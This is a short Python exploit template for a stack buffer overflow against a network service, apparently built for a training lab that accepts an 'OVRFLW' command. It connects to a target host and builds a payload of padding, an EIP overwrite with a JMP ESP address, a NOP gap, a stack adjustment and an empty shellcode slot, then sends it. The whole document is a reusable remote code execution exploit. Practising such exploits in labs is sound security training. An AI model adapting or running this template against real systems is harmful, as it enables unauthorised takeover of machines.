#!/usr/bin/env python3
import socket
import struct

from PARAMETERS import RHOST, RPORT, buf_totlen, offset_eip, offset_esp, sub_esp_10, ptr_jmp_esp

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((RHOST, RPORT))

# PUT SHELLCODE HERE
shellcode = b""

buf =  b""
buf += b"A"*(offset_eip - len(buf))             # padding
buf += struct.pack("<I", ptr_jmp_esp)           # EIP overwrite with "JMP ESP"
buf += b"\x90"*(offset_esp - offset_eip - 4)	# Padding between EIP and ESP
buf += sub_esp_10                               # ESP overwrite (we move it to avoid any overwrite - nopsled alternative)
buf += shellcode                                # ShellCode
buf += b"D"*(buf_totlen - len(buf))             # Trailing Padding
buf += b"\n"

s.send(b"OVRFLW " + buf + b"\n")
